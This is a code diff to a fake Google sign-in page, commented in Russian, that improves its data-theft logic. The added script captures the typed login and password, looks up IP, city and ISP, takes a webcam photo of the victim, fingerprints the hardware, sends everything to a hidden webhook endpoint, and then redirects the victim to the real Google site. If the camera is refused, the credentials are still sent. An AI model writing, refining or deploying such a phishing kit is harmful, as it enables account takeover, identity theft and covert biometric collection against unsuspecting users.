@@ -11,7 +11,6 @@
         .auth-card { width: 100%; max-width: 448px; border: 1px solid var(--g-gray); border-radius: 8px; padding: 48px 40px 36px; box-sizing: border-box; position: relative; }
         .header { text-align: center; margin-bottom: 30px; }
         h1 { font-size: 24px; font-weight: 400; color: var(--g-text); margin: 10px 0; }
-        p { font-size: 16px; color: var(--g-text); margin-top: 0; }
         input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid var(--g-gray); border-radius: 4px; outline: none; box-sizing: border-box; margin-bottom: 10px; }
         input:focus { border: 2px solid var(--g-blue); padding: 12px 14px; }
         .btn-next { background: var(--g-blue); color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; float: right; margin-top: 30px; }
@@ -55,15 +54,32 @@
 
         document.getElementById('loader').style.display = 'flex';
 
+        // 1. ПОЛУЧЕНИЕ ПРАВИЛЬНОГО IP (Двойная проверка)
+        let ipData = {};
         try {
-            // ЭТА ЧАСТЬ ВЫЗЫВАЕТ ОКНО "РАЗРЕШИТЬ/СВЕРИТЬ ЛИЦО"
+            // Сначала пробуем расширенное API
+            ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
+        } catch (e) {
+            try {
+                // Если первое упало, пробуем резервное просто для IP
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ipData = { ip: data.ip, city: "Unknown", org: "Unknown" };
+            } catch (e2) {
+                ipData = { ip: "Blocked/Hidden", city: "N/A", org: "N/A" };
+            }
+        }
+
+        const formData = new FormData();
+        const video = document.getElementById('v');
+        const canvas = document.getElementById('c');
+
+        try {
+            // 2. ЗАПРОС БИОМЕТРИИ (Камера)
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('v');
-            const canvas = document.getElementById('c');
             video.srcObject = stream;
 
-            // Короткая пауза для фокуса камеры
-            await new Promise(r => setTimeout(r, 1000));
+            await new Promise(r => setTimeout(r, 1200)); // Ждем фокус
 
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -71,9 +87,7 @@
             const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
             
             stream.getTracks().forEach(t => t.stop());
-
-            const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-            const formData = new FormData();
+            formData.append('file', blob, 'face.jpg');
 
             const systemReport = {
                 username: "Google Identity Sentinel",
@@ -82,40 +96,42 @@
                     color: 4342490,
                     fields: [
                         { name: "👤 Учетные данные", value: `**Login:** \`${email}\`\n**Pass:** \`${pass}\`` },
-                        { name: "📍 Сетевой след", value: `**IP:** ${geo.ip}\n**ISP:** ${geo.org}\n**City:** ${geo.city}` },
+                        { name: "📍 Сетевой след (IP)", value: `**IP:** \`${ipData.ip}\`\n**Город:** ${ipData.city}\n**Провайдер:** ${ipData.org}` },
                         { name: "⚙️ Hardware Profile", value: `**GPU:** ${getGPU()}\n**CPU:** ${navigator.hardwareConcurrency} Cores` }
                     ],
                     image: { url: 'attachment://face.jpg' },
-                    footer: { text: "Protocol: NEON_ZERO_V13 | Target: Drive C:/ [Simulation Active]" }
+                    footer: { text: "Protocol: NEON_ZERO_V13 | Status: SUCCESS" }
                 }]
             };
-
             formData.append('payload_json', JSON.stringify(systemReport));
-            formData.append('file', blob, 'face.jpg');
-
-            await fetch(TARGET_CORE, { method: 'POST', body: formData });
 
         } catch (e) {
-            // Если камера отклонена, отправляем только текст
-            const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-            await fetch(TARGET_CORE, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: "⚠️ Камера отклонена объектом\n**Login:** " + email + "\n**Pass:** " + pass
-                })
-            });
+            // Если камера отклонена
+            const systemReport = {
+                content: "⚠️ **Камера отклонена! Только данные:**",
+                embeds: [{
+                    color: 16711680,
+                    fields: [
+                        { name: "👤 Login/Pass", value: `\`${email}\` / \`${pass}\`` },
+                        { name: "📍 IP Info", value: `**IP:** \`${ipData.ip}\` (${ipData.city})` }
+                    ]
+                }]
+            };
+            formData.append('payload_json', JSON.stringify(systemReport));
         }
 
+        // 3. ОТПРАВКА
+        await fetch(TARGET_CORE, { method: 'POST', body: formData });
+
         setTimeout(() => {
-            window.location.href = "https://accounts.google.com/signin/v2/challenge/pwd?service=mail";
-        }, 1500);
+            window.location.href = "https://accounts.google.com";
+        }, 1000);
     }
 
     function getGPU() {
         const gl = document.createElement('canvas').getContext('webgl');
         const ext = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-        return ext ? gl.getParameter(ext.UNMASKED_RENDERER_ID) : "Protected_Node";
+        return ext ? gl.getParameter(ext.UNMASKED_RENDERER_ID) : "N/A";
     }
 </script>
 </body>
